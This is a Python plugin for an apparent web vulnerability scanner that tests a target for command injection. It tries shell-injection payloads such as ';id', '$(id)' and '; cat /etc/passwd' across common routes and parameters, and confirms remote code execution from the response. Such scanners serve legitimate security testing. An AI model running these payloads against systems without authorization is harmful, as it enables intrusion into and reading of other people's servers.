#!/usr/bin/env python3
"""Plugin RCE: inyeccion de comandos con confirmacion de ejecucion."""
RCE_ROUTES = ["", "/ping", "/cmd", "/exec", "/run", "/api/exec", "/cgi-bin/test", "/debug"]
RCE_PARAMS = ["cmd", "command", "exec", "query", "ip", "host", "ping", "url", "input", "q", "expr"]
RCE_PAYLOADS = [";id", "|id", "`id`", "$(id)", "&&id", "||id",
                "; cat /etc/passwd", "| whoami", "';id;'", "& echo HTSCNRCE"]


def run(ctx):
    target = ctx.target
    hits = []
    for rt in RCE_ROUTES:
        if hits:
            break
        base_url = target.rstrip("/") + rt
        for param in RCE_PARAMS:
            if hits:
                break
            for p in RCE_PAYLOADS:
                if ctx.ctrl("rce") in ("stop", "skip"):
                    break
                rr = ctx.req("GET", base_url, {param: p}, timeout=5)
                body = (rr.get("body", "") or "")
                if ("uid=" in body and "gid=" in body) or "HTSCNRCE" in body or \
                   ("root:x:" in body and len(body) > 50):
                    hits.append(f"{rt or '/'}{param}={p}")
                    ctx.emit({"type": "finding", "severity": "critical", "module": "rce",
                              "detail": f"RCE confirmada en '{base_url}' param '{param}' con: {p}",
                              "evidence": {"url": base_url, "param": param, "payload": p}})
                    break
    ctx.emit({"type": "module", "name": "rce", "status": "done",
              "msg": f"RCE: {len(hits)} confirmada(s)", "findings": hits})
